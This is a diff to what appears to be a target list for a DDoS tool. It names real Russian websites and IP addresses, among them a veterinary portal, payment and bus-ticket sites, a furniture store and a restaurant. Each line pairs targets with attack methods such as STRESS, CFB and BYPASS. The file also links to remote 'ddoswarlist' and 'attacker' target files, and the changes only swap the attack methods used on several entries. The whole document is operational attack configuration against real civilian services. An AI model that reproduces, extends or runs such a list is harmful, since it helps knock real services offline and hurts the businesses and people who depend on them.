@@ -6,7 +6,7 @@ https://vetrf.ru/ https://idp.vetrf.ru/idp/profile/SAML2/POST/SSO?execution=e1s1
 
 https://62.76.145.83:443 http://62.76.145.85:8443 http://62.76.145.203:80 http://62.76.145.203:8080 tcp://62.76.145.85:8443 tcp://62.76.145.84:443 tcp://62.76.145.10:80 tcp://62.76.145.10:443 --http-methods GET STRESS
 
-https://payanyway.ru https://www.avtovokzaly.ru https://bus.tutu.ru https://185.111.86.13:443 --http-methods GET DGB STRESS
+https://payanyway.ru https://www.avtovokzaly.ru https://bus.tutu.ru https://185.111.86.13:443 --http-methods GET STRESS
 
 https://213.59.254.7:443 http://213.59.253.7:80 https://213.59.253.7:443 --http-methods GET STRESS
 
@@ -86,7 +86,7 @@ https://mebel-ekb.com https://mebel-ekb.com/kupi-v-kredit/ https://mebel-ekb.com
 
 https://tokyo-hm.ru https://tokyo-hm.ru/index/desserts/ https://tokyo-hm.ru/shipping-and-payment.html 185.78.31.31:80 185.78.31.31:443 https://185.78.31.31:443 tcp://185.78.31.31:21 tcp://185.78.31.31:22 tcp://185.78.31.31:80 tcp://185.78.31.31:443 --http-methods GET STRESS
 
-https://www.cse.ru/ tcp://185.65.20.5:443 tcp://185.65.22.8:8015 tcp://185.65.22.8:993 --http-methods CFB
+https://www.cse.ru/ tcp://185.65.20.5:443 tcp://185.65.22.8:8015 tcp://185.65.22.8:993 --http-methods CFB STRESS
 
 tcp://93.174.48.173:443 tcp://178.57.71.182:80 tcp://178.57.71.182:443 tcp://178.57.71.190:80 tcp://178.57.71.190:443 tcp://178.57.71.180:443 tcp://185.31.134.104:443 tcp://178.57.71.190:80 tcp://178.57.71.190:443
 
@@ -114,7 +114,7 @@ https://213.59.254.7:443 http://213.59.253.7:80 https://213.59.253.7:443 --http-
 
 -c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer4.lst
 
--c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer7.lst --http-methods BYPASS CFB
+-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer7.lst --http-methods BYPASS STRESS
 
 -c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp1 --http-methods GET STRESS
 
